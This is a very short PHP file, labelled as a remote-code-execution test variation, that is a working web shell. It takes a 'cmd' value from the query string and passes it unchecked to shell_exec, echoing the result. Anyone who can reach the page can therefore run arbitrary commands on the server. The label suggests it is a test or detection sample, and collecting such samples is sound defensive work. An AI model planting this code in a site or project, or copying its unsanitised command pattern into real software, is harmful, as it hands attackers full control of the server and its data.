<?php
// RCE test variation #1213
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>